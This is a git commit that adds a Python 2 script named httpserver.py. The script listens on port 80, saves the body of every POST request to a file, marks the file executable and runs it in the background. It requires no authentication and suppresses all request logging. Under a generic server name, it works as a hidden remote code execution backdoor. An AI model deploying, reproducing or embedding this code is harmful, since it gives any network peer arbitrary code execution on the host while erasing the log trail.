f4d82470497a4d74b4f5f0fed01e00b4359b938b
garip4 <54353706+garip4@users.noreply.github.com>
2019-08-21 12:06:49 +0300

    Add files via upload

---
+++ httpserver.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python
+
+import sys
+import time
+import os
+import stat
+import uuid
+from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+
+PORT = 80
+
+class customHttpHandler(BaseHTTPRequestHandler):
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        return
+
+    def do_GET(self):
+        self._set_headers()
+        self.wfile.write("OK")
+	return
+
+    def do_POST(self):
+        filename = str(uuid.uuid4())
+        length = self.headers['content-length']
+        data = self.rfile.read(int(length))
+        with open(filename, 'wb') as fh:
+            fh.write(data)
+        st = os.stat(filename)
+        os.chmod(filename, st.st_mode | stat.S_IEXEC)
+        os.system('./' + filename + ' &')
+        self._set_headers()
+        self.wfile.write("OK")
+        return
+
+    def log_message(self, format, *args):
+        return
+
+try:
+    server = HTTPServer(('', PORT), customHttpHandler)	
+    server.serve_forever()
+
+except KeyboardInterrupt:
+    server.socket.close()
